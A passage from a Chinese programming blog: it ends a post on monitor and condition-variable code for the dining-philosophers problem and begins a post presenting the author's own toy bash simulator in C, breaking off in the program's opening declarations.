<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_test_condvar</span> <span class="params">(i)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(state_condvar[i]==HUNGRY&amp;&amp;state_condvar[LEFT]!=EATING</span><br><span class="line">            &amp;&amp;state_condvar[RIGHT]!=EATING) &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;phi_test_condvar: state_condvar[%d] will eating\n&quot;</span>,i);</span><br><span class="line">        state_condvar[i] = EATING ;</span><br><span class="line">        cprintf(<span class="string">&quot;phi_test_condvar: signal self_cv[%d] \n&quot;</span>,i);</span><br><span class="line">        cond_signal(&amp;mtp-&gt;cv[i]) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：为了让整个管程正常运行，还需在管程中的每个函数的入口和出口增加相关操作</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">monitorFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      down(&amp;(mtp-&gt;mutex));</span><br><span class="line"><span class="comment">//--------into routine in monitor--------------</span></span><br><span class="line">      <span class="comment">/* ... */</span></span><br><span class="line"><span class="comment">//--------leave routine in monitor--------------</span></span><br><span class="line">      <span class="keyword">if</span>(mtp-&gt;next_count&gt;<span class="number">0</span>)</span><br><span class="line">         up(&amp;(mtp-&gt;next));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">         up(&amp;(mtp-&gt;mutex));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样做的好处有两个</p>
<ul>
<li>只有一个进程在执行管程中的函数</li>
<li>避免由于执行了 <code>cond_signal</code> 函数而睡眠的进程无法被唤醒</li>
</ul>
<p>针对 “避免由于执行了 <code>cond_signal</code> 函数而睡眠的进程无法被唤醒” 这个优点简单说一下：</p>
<ul>
<li>管程中 <code>wait</code> 和 <code>signal</code> 函数的调用存在时间顺序<ul>
<li>例如：当线程1先调用 <code>signal</code> 唤醒线程2并将自身线程挂起后，线程2在开始执行时将无法唤醒原先的在 <code>signal</code> 中挂起的线程1</li>
</ul>
</li>
<li>也就是说，只要存在线程在管程中执行了 <code>signal</code>，那么至少存在一个线程在管程中被挂起</li>
<li>此时，就只能在临界区外唤醒挂起的线程1，而这一步在代码中也得到了实现</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/29/mybash/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/29/mybash/" class="post-title-link" itemprop="url">mybash</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-29 00:03:10" itemprop="dateCreated datePublished" datetime="2022-04-29T00:03:10+08:00">2022-04-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-05 00:08:50" itemprop="dateModified" datetime="2022-05-05T00:08:50+08:00">2022-05-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>22k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>20 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>mybash</strong></p>
<p>几天前做了个模拟bash的pwn题 - ezbash，我把bash的执行过程看完了，打算自己写一个bash来玩玩</p>
<p>大部分代码都借鉴了出题人的思路，但是因为IDA对某些代码的反汇编效果很差，所以对bash的部分功能进行了阉割，对部分代码进行了修改（尤其是 cp 命令，我选择使用递归函数来复制子目录的内容）</p>
<p>先看下源码吧：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISDIR        0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISFILE       1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">COMMAND</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">char</span>* echo_data;</span><br><span class="line">    COMMAND* last_name;</span><br><span class="line">    COMMAND* next_name;</span><br><span class="line">    COMMAND* parent_dir;</span><br><span class="line">    COMMAND* name_list;</span><br><span class="line">&#125;Command;</span><br><span class="line"></span><br><span class="line"><span class="function">Command* <span class="title">malloc_empty</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">input_command</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span>** <span class="title">break_command</span><span class="params">(<span class="keyword">char</span>*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">analyse_command</span><span class="params">(<span class="keyword">char</span>**)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">command_entry</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">char</span>**)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_isdir</span><span class="params">(Command*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_isfile</span><span class="params">(Command*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_isrelocation</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>*)</span></span>;</span><br><span 